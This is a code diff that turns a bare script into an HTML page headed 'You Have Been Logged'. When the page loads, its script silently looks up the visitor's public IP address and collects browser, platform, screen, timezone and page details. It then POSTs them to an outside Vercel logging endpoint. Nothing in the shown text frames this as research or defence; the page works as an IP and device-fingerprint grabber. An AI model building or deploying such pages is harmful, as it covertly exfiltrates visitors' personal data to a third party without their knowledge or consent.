@@ -1,21 +1,34 @@
-<script>
-(async () => {
-  const data = {
-    userAgent: navigator.userAgent,
-    deviceType: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Mobile" : "Desktop",
-    screenSize: `${screen.width}x${screen.height}`,
-    url: location.href,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  };
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>You Have Been Logged</title>
+</head>
+<body>
+  <h1>You Have Been Logged</h1>
 
-  try {
-    await fetch("https://your-vercel-project.vercel.app/api/log", {  // <-- Replace with your Vercel URL
+  <script>
+  (async () => {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const json = await res.json();
+
+    const payload = {
+      ip: json.ip,
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      screenSize: `${screen.width}x${screen.height}`,
+      url: location.href,
+      platform: navigator.platform,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      localTime: new Date().toString()
+    };
+
+    fetch('https://brainrot-vercel-logger-svxi.vercel.app/api/log', {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
+      body: JSON.stringify(payload)
     });
-  } catch (e) {
-    console.error("Failed to send visitor data", e);
-  }
-})();
-</script>
+  })();
+  </script>
+</body>
+</html>
